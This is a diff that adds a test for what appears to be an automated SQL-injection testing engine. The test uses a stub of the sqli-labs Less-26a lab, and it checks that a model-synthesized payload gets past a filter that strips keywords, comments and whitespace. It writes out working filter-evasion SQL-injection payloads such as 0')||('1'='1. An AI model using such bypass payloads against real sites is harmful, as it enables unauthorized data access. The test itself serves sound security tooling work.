@@ -141,6 +141,58 @@ describe("attempt — technique-aware dispatch", () => {
     expect(rejected.ok).toBe(false);
   });
 
+  it("generalizes the model bypass to a string+parenthesis context behind a WAF-style filter", async () => {
+    // Models sqli-labs Less-26a: WHERE id=('$id') — a quoted, parenthesized,
+    // blind context behind a WAF that strips or/and AND spaces AND comments. Every
+    // fixed probe dies; only a payload that closes the quote+paren, uses `||`
+    // instead of OR, and contains no whitespace survives (e.g. 0')||('1'='1).
+    const less26a = new StubSession((req) => {
+      const raw = new URL(req.url).searchParams.get("id") ?? "";
+      const filtered = raw
+        .replace(/or/gi, "")
+        .replace(/and/gi, "")
+        .replace(/[/*#-]/g, "")
+        .replace(/\s/g, "");
+      // The value is substituted into WHERE id=('<filtered>'); a row returns iff
+      // that expression is true — the natural value, or a bypass that reopens the
+      // paren with a surviving tautology, e.g. ('0')||('1'='1').
+      const expr = `('${filtered}')`;
+      const row =
+        raw.trim() === "1" || (/\)(\|\||or|&&)\(/i.test(expr) && /'(\w+)'='\1'/.test(expr));
+      const login = row ? "<p>Your Login name: adminuser Your Password: s3cret</p>" : "";
+      return {
+        status: 200,
+        body: `<html><body><h2>Welcome Dhakkan</h2>${login}<p>Hint: ${raw}</p></body></html>`,
+      };
+    });
+
+    const floorMiss = await attempt(
+      less26a,
+      "SQL Injection",
+      opts({ url: "http://localhost:3000/Less-26a/", method: "GET", fields: ["id"] }),
+    );
+    expect(floorMiss.ok).toBe(false);
+
+    // The model returns pairs across contexts; the engine confirms the one that
+    // actually reproduces the true/false split — here the string+paren `||` bypass.
+    const smith = async () => [
+      { t: "0 oorr 1=1", f: "0 oorr 1=2" }, // numeric — does NOT fit this context
+      { t: "0')||('1'='1", f: "0')||('1'='2" }, // string+paren — fits
+    ];
+    const hit = await attempt(
+      less26a,
+      "SQL Injection",
+      opts({
+        url: "http://localhost:3000/Less-26a/",
+        method: "GET",
+        fields: ["id"],
+        payloadSmith: smith,
+      }),
+    );
+    expect(hit.ok).toBe(true);
+    expect(hit.note).toMatch(/model-synthesized bypass/);
+  });
+
   it("confirms boolean-based SQLi on a POST form when an always-true condition returns more rows", async () => {
     // DVNA's /app/usersearch swallows the engine error (generic page) but builds
     // the query by concatenation: an always-true tautology dumps rows an always-
